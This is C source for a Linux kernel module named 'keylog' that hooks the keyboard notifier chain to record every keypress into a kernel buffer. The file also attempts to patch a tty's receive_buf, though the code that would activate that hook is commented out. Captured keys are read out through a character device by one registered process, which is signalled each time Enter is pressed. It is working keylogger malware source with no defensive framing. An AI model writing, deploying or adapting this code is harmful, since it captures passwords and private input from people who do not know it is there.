#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>   /* printk() */
#include <linux/slab.h>     /* kmalloc() */
#include <linux/fs.h>       /* everything... */
#include <linux/errno.h>    /* error codes */
#include <linux/types.h>    /* size_t */
#include <linux/proc_fs.h>
#include <linux/fcntl.h>    /* O_ACCMODE */
#include <asm/system.h>     /* cli(), *_flags */
#include <asm/uaccess.h>    /* copy_from/to_user */
#include <asm/string.h>     /* strncpy */

#include <linux/sched.h>
#include <linux/signal.h>

#include <linux/keyboard.h> /* register_keyboard_notifier etc */
#include <linux/tty.h>

#include "keymap.h"

#define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );

#define KEYLOG_MAJOR 65
#define KEYLOG_NAME  "keylog"

#define KEYLOG_BUF_SIZE 1024

MODULE_LICENSE( "Dual BSD/GPL" );

static char *key_buffer = NULL, *pid_buffer = NULL;
static int  cur_buf_length = 0;
static pid_t  registered_pid = -1; // Only allow one pid to register at a time

static void (*old_receive_buf) (struct tty_struct *tty, const unsigned char *cp,
                        char *fp, int count);
struct file *file;
struct tty_struct *tty;


int key_open( struct inode *inode, struct file *filp );
ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos );
ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos );
int key_release( struct inode *inode, struct file *filp );

struct file_operations fops = {
    read:    key_read,
    write:   key_write,
    open:    key_open,
    release: key_release,
};

int key_open( struct inode *inode, struct file *filp ) {
    print812( "Received an open" );

    return 0;
}

ssize_t key_write( struct file *filp, const char *buf, size_t count, loff_t *f_pos ) {
    char *endptr;
    int  err = 0;

    if ( count >= KEYLOG_BUF_SIZE ) {
        print812( "Writing too many bytes (%zu). Bailing", count );
        return 0;
    }
    
    err = copy_from_user( pid_buffer, buf, count );
    if ( err < 0 ) {
        print812( "Failed copying data from user process (%d)", err );
        return 0;
    }

    print812( "Registering process %s", pid_buffer );
    
    registered_pid = simple_strtol( pid_buffer, &endptr, 10 );
    if ( registered_pid == 0 && endptr == pid_buffer ) {
       print812( "Failed to parse pid" );
       registered_pid = -1;
    }

    return count;
}

ssize_t key_read( struct file *filp, char *buf, size_t count, loff_t *f_pos ) {
    int err = 0;

    if ( *f_pos == 0 ) {
        err = copy_to_user( buf, key_buffer, cur_buf_length );
        if ( err < 0 ) {
            print812( "Copying to user failed (%d)", err );
            return err;
        }

        *f_pos = cur_buf_length;
        cur_buf_length = 0; // Reset buf length to read more content
        return *f_pos;
    } else {
        return 0;
    }
}

struct file* file_open(const char* path, int flags, int rights) {
    struct file* filp = NULL;
    mm_segment_t oldfs;
    int err = 0;
    
    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if(IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }

    return filp;   
}

// Sends the IO signal to let listening processes know a command was entered
void SendKey()
{
    struct siginfo     *sinfo;    /* signal information */
    struct task_struct *task;

    sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
    if ( sinfo == NULL ) {
        print812( "Failed to allocate siginfo for signal sending" );
        return;
    }
    sinfo->si_signo = SIGIO;
    sinfo->si_code = SI_USER;
   
    task = pid_task( find_vpid( registered_pid ), PIDTYPE_PID ); 
    if ( task == NULL ) {
        print812( "Failed to find task with pid %d", registered_pid );
        return;
    }
    
    send_sig_info( SIGIO, sinfo, task );

    if ( sinfo != NULL ) {
        kfree( sinfo );
    }
}

void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
{   
    const char *key_name = NULL; 
    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening

    if(startBuffering && (count > 0))
    {
        if (!tty->real_raw && !tty->raw)
        {
            char dstStr[count + 1];
            strncpy(dstStr, cp, count);
            dstStr[count] = '\0';
            
            key_name = get_tty_key_str(dstStr, count);

            if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
                cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
            }
            
            // Wait until a command has been entered before notifying listeners
            if ( strcmp( "Enter", key_name ) == 0  ) {
                SendKey();
            }
        }
    }

    /* call the original receive_buf */
    (*old_receive_buf)(tty, cp, fp, count);
}

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
    struct keyboard_notifier_param *param = _param;
    char *key_name = NULL; 
    int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening


    if ( code == KBD_KEYCODE && param->down && startBuffering ) {
        key_name = GET_KEYNAME( param->value );

        if ( strlen( key_name ) + cur_buf_length < KEYLOG_BUF_SIZE ) {
            cur_buf_length += sprintf( key_buffer + cur_buf_length, "%s", key_name );
        }

        if ( strcmp( "Enter", key_name ) == 0 ) {
            SendKey();
        }
    }

    return NOTIFY_OK;
}

static struct notifier_block keyboardNotifierBlock = {
        .notifier_call = hello_notify
};

int key_release( struct inode *inode, struct file *filp ) {
    print812( "In release method" );

    return 0;
}

static int hello_init( void ) {
    int err;
    print812( "Initializing the module." );

    err = register_chrdev( KEYLOG_MAJOR, KEYLOG_NAME, &fops );
    if ( err < 0 ) {
        print812( "Registering chrdev failed (%d)", err );
        return err;
    }

    key_buffer = kzalloc( sizeof(char) * KEYLOG_BUF_SIZE, GFP_KERNEL );
    if ( !key_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate keybuffer (%d)", err );
        
        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        return err;
    }

    pid_buffer = kzalloc( sizeof(char) *KEYLOG_BUF_SIZE, GFP_KERNEL );
    if ( !pid_buffer ) {
        err = -ENOMEM;
        print812( "Failed to allocate pidbuffer(%d)", err );

        unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );
        return err;
    }

    register_keyboard_notifier(&keyboardNotifierBlock);
    
    // file = file_open("/dev/tty1", O_RDONLY, 0);
    if(file != NULL)
    {
        tty = file->private_data;
        
        if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) &&
            (tty->ldisc->ops->receive_buf != NULL))
        {
            old_receive_buf = tty->ldisc->ops->receive_buf;
            tty->ldisc->ops->receive_buf = new_receive_buf;
        }
    }

    return 0;
}

static void hello_exit( void ) {
    print812( "Unregistering the module" );

    unregister_keyboard_notifier(&keyboardNotifierBlock);

    if(file != NULL)
    {
        filp_close(file, NULL);
    }
    if((tty != NULL) && (tty->ldisc != NULL) && (tty->ldisc->ops != NULL) && 
        (tty->ldisc->ops->receive_buf != NULL) && (old_receive_buf != NULL))
    {
        tty->ldisc->ops->receive_buf = old_receive_buf;
    }

    unregister_chrdev( KEYLOG_MAJOR, KEYLOG_NAME );

    if ( key_buffer != NULL ) {
        kfree( key_buffer );
    }

    if ( pid_buffer != NULL ) {
        kfree( pid_buffer );
    }
}

module_init( hello_init );
module_exit( hello_exit );
